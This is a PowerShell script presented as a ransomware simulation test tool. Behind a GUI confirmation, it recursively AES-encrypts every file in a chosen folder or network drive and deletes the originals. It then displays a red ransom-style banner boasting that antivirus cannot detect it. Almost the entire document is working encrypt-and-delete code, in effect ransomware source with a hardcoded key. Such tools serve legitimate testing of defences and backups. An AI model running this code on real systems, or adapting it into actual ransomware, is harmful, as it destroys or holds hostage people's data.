$global:processedfile=0;
$Key = 'enctest@123'
$shaManaged = New-Object System.Security.Cryptography.SHA256Managed
$aesManaged = New-Object System.Security.Cryptography.AesManaged
$aesManaged.Mode = [System.Security.Cryptography.CipherMode]::CBC
$aesManaged.Padding = [System.Security.Cryptography.PaddingMode]::Zeros
$aesManaged.BlockSize = 128
$aesManaged.KeySize = 256
$aesManaged.Key = $shaManaged.ComputeHash([System.Text.Encoding]::UTF8.GetBytes($Key))
$encryptor = $aesManaged.CreateEncryptor()

Function EncryptDel($File){
  $plainBytes = [System.IO.File]::ReadAllBytes($File)
  $outPath = $File + ".encrypted"

  $encryptedBytes = $encryptor.TransformFinalBlock($plainBytes, 0, $plainBytes.Length)
  $encryptedBytes = $aesManaged.IV + $encryptedBytes

  [System.IO.File]::WriteAllBytes($outPath, $encryptedBytes)
  $global:processedfile += 1
  Write-Host "Encrypt to $outPath"
  Remove-Item $File
  Write-Host "Delete $File"
  if ([System.IO.File]::Exists($File)) {
    Write-Host $File 'is exist'
  }Else{
    Write-Host $File 'is not exist'
  }
  Write-Host
}

Function Banner{
  "<html>" | Out-File -FilePath popup.html
  "<head>" | Out-File -FilePath popup.html -Append
  "<title>EncryptDelTestv3</title>" | Out-File -FilePath popup.html -Append
  "<body bgcolor=red>" | Out-File -FilePath popup.html -Append
  "<font size=+10 color=white><b>[EncryptDelTestv3]</b></font><br><br><br><br>" | Out-File -FilePath popup.html -Append
  "<font size=+10 color=white>Your anti-virus software <u>CANNOT</u> detect this test</font><br><br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>Encryption Key: " + $Key  | Out-File -FilePath popup.html -Append
  "<br>Encrypted File: " + $global:processedfile | Out-File -FilePath popup.html -Append
  "<br>Path: " + $FolderBrowserDialog.SelectedPath | Out-File -FilePath popup.html -Append
  "<br>" + (Get-Date).ToString('MM/dd/yyyy hh:mm:ss tt') | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "<br>" | Out-File -FilePath popup.html -Append
  "</body>" | Out-File -FilePath popup.html -Append
  "</html>" | Out-File -FilePath popup.html -Append
  Invoke-Expression .\popup.html
  Write-Host ""
  Write-Host "Encryption Key: " $Key
  Write-Host "Encrypted File: " $global:processedfile
  Write-Host "Your anti-virus software CANNOT detect this test"
}

Add-Type -AssemblyName System.Windows.Forms
Add-Type -AssemblyName System.Drawing

$objForm = New-Object System.Windows.Forms.Form
$objForm.AutoSize = $True
$objForm.Text = "[Encrypt Delete Test v3]"
$objForm.StartPosition = "CenterScreen"

$objLabel = New-Object System.Windows.Forms.label
$objLabel.Text = "[Encrypt Delete Test v3]
Simulate ransomware encryption operation
By Eddie Chu eddiechu.android@gmail.com
Please download the original and latest version from github.com/eddiechu/Encrypt-Delete-Test
Version v3.0.4 (14/Aug/2021)`r`n
This tool encrypt the file under selected folder and it's subfolder(s))`r`n
[Caution]
You use this tool completely at your own risk.
"
$objLabel.AutoSize = $True
$objForm.Controls.Add($objLabel)

Write-Host $objLabel.Text
 
$objCombobox=New-Object System.Windows.Forms.combobox
$objCombobox.Text = "Please select"
$objCombobox.Items.add("Confirm")
$objCombobox.Top = ($objLabel.Height + 10)
$objForm.Controls.Add($objCombobox)
 
$button_click=
{ 
  if ($objCombobox.SelectedItem -eq "confirm"){
    Write-Host 'confirm'
    $FolderBrowserDialog = New-Object System.Windows.Forms.FolderBrowserDialog
    $FolderBrowserDialog.SelectedPath = (Get-Location).path
    [void] $FolderBrowserDialog.ShowDialog()
    Write-Host $FolderBrowserDialog.SelectedPath
    Write-Host
    Get-ChildItem $FolderBrowserDialog.SelectedPath -Recurse -Attributes !Directory | % {EncryptDel $_.FullName}
    Banner
  }
  Else{
    [System.Windows.Forms.MessageBox]::Show('Please select confirm',"[Encrypt Delete Test v3]",[System.Windows.Forms.MessageBoxButtons]::OK,[System.Windows.Forms.MessageBoxIcon]::Warning)
  }
}  

$objButton = New-Object System.Windows.Forms.Button
$objButton.Top = ($objLabel.Height + 50)
$objButton.Text = "Choose a folder or network drive to process the test"
$objButton.AutoSize = $True
$objButton.Add_Click($button_click)
$objForm.Controls.Add($objButton)

$objForm.ShowDialog()

$aesManaged.Dispose()
$shaManaged.Dispose()
